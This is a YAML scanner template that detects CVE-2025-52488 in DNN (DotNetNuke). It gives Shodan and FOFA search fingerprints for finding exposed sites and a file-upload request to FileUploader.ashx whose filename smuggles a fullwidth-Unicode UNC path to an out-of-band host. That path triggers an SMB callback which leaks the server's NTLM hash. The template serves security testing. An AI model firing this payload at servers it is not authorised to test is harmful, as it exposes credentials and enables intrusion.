id: CVE-2025-52488

info:
  name: DNN (DotNetNuke) - Unicode Path Normalization NTLM Hash Disclosure
  author: assetnote,DhiyaneshDk,iamnoooob,pdresearch
  severity: high
  description: |
    DNN (formerly DotNetNuke) is an open-source web content management platform (CMS) in the Microsoft ecosystem. In versions 6.0.0 to before 10.0.1, DNN.PLATFORM allows a specially crafted series of malicious interaction to potentially expose NTLM hashes to a third party SMB server. This issue has been patched in version 10.0.1.
    shodan:
      - "Set-Cookie: dnn_IsMobile"
      - http.favicon.hash:-1465479343
    fofa:
      - app="dotnetnuke"
      - "Set-Cookie: dnn_IsMobile"
      - icon_hash="-1465479343"
  reference:
    - https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-mgfv-2362-jq96
    - https://slcyber.io/assetnote-security-research-center/abusing-windows-net-quirks-and-unicode-normalization-to-exploit-dnn-dotnetnuke/#hunting-variants
  tags: cve,cve2025,fileupload,dotnetnuke,oast,oob,dnnsoftware,oss,ntlm
  created: 2025/07/30

set:
  rboundary: randomLowercase(8)
  oob: oob()
  oobDNS: oob.DNS
  replaceStr: replaceAll("%EF%BC%BC%EF%BC%BC" + oobDNS + "%EF%BC%BC%EF%BC%BCc$%EF%BC%BC%EF%BC%BCan.jpg", '.','%EF%BC%8E')
  urldecodePayload: urldecode(replaceStr)
  randstr: randomLowercase(10)
rules:
  r0:
    request:
      method: POST
      path: /Providers/HtmlEditorProviders/DNNConnect.CKE/Browser/FileUploader.ashx?PortalID=0&storageFolderID=1&overrideFiles=false
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: |
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="file"; filename="{{urldecodePayload}}"
        Content-Type: image/jpeg

        {{randstr}}
        ------WebKitFormBoundary{{rboundary}}--
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
